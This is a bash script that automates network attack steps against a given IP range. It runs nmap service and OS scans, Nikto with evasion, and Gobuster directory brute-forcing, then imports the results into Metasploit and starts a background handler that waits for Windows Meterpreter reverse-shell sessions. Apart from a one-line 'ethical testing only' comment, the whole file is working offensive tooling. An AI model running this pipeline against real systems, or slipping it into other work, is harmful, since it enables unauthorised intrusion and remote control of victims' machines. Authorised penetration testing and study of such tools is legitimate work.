#!/bin/bash

# Automated Nmap Discovery + Nikto + Gobuster Directory Brute-Force + Metasploit Handler
# Ethical penetration testing only!

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_range> (e.g., 192.168.1.0/24 or 10.0.0.0/24)"
    exit 1
fi

TARGET_RANGE=$1
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="scan_results_${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"

NMAP_XML="$OUTPUT_DIR/nmap_scan.xml"
WEB_HOSTS="$OUTPUT_DIR/web_hosts.txt"

# Common web ports to scan
WEB_PORTS="80,81,443,444,8000,8080,8081,8443"

# Gobuster settings
WORDLIST="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
EXTENSIONS="php,html,txt,bak,js,json,xml,config"
THREADS=50
STATUS_CODES="200,204,301,302,307,401,403"

# Auto-detect attacker IP
LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
LPORT=4444
PAYLOAD="windows/x64/meterpreter/reverse_tcp"

echo "[+] Starting discovery scan on $TARGET_RANGE (ports: $WEB_PORTS)"
nmap -sV -O -p $WEB_PORTS --open "$TARGET_RANGE" -oX "$NMAP_XML" -oN "$OUTPUT_DIR/nmap_full.txt"

echo "[+] Extracting web servers"
grep -E 'portid="('"${WEB_PORTS//,/|}"')"' "$NMAP_XML" | grep open | \
    awk -F'[ />]' '{print $6 "\t" $10}' | sort -u > "$WEB_HOSTS"

if [ ! -s "$WEB_HOSTS" ]; then
    echo "[-] No web servers found on common ports."
else
    echo "[+] Found web servers:"
    cat "$WEB_HOSTS"
fi

# Nikto scans
echo "[+] Running Nikto on detected web servers"
while read -r ip port; do
    protocol="http"
    [[ "$port" =~ ^(443|444|8443)$ ]] && protocol="https"

    url="${protocol}://${ip}:${port}"
    nikto_output_txt="$OUTPUT_DIR/nikto_${ip}_${port}.txt"
    nikto_output_msf="$OUTPUT_DIR/nikto_${ip}_${port}.msf"
    nikto_output_xml="$OUTPUT_DIR/nikto_${ip}_${port}.xml"

    echo "[++] Scanning $url with Nikto..."
    nikto -h "$url" -output "$nikto_output_txt" -Format txt \
          -output "$nikto_output_msf" -Format msf+ \
          -output "$nikto_output_xml" -Format xml \
          -Tuning 1234567890 -evasion 1 -maxtime 300
done < "$WEB_HOSTS"

# Gobuster directory brute-forcing
echo "[+] Running Gobuster directory brute-force on detected web servers"
while read -r ip port; do
    protocol="http"
    [[ "$port" =~ ^(443|444|8443)$ ]] && protocol="https"

    url="${protocol}://${ip}:${port}"
    gobuster_output="$OUTPUT_DIR/gobuster_${ip}_${port}.txt"

    echo "[++] Brute-forcing $url with Gobuster (wordlist: $WORDLIST)"
    gobuster dir -u "$url" -w "$WORDLIST" -x "$EXTENSIONS" \
             -t "$THREADS" -s "$STATUS_CODES" -e -k -o "$gobuster_output"
    
    echo "    Results saved to $gobuster_output"
done < "$WEB_HOSTS"

# Metasploit setup
echo "[+] Starting Metasploit database and importing Nmap results"
service postgresql start
msfdb init 2>/dev/null || true

msfconsole -q -x "db_import $NMAP_XML; workspace -a $TIMESTAMP; hosts; services; vulns; exit"

echo "[+] Starting reverse handler (listening on $LHOST:$LPORT)"
cat << EOF > /tmp/handler.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

msfconsole -q -r /tmp/handler.rc &

echo "[+] All scans complete!"
echo "    - Results folder: $OUTPUT_DIR"
echo "    - Review Nikto TXT/MSF+ files and Gobuster outputs for interesting paths/vulns."
echo "    - Run 'msfconsole -q -x \"workspace $TIMESTAMP; vulns -o\"' to see imported data."
echo "    - Check sessions: msfconsole -q -x 'sessions -l'"

# Optional: rm /tmp/handler.rc
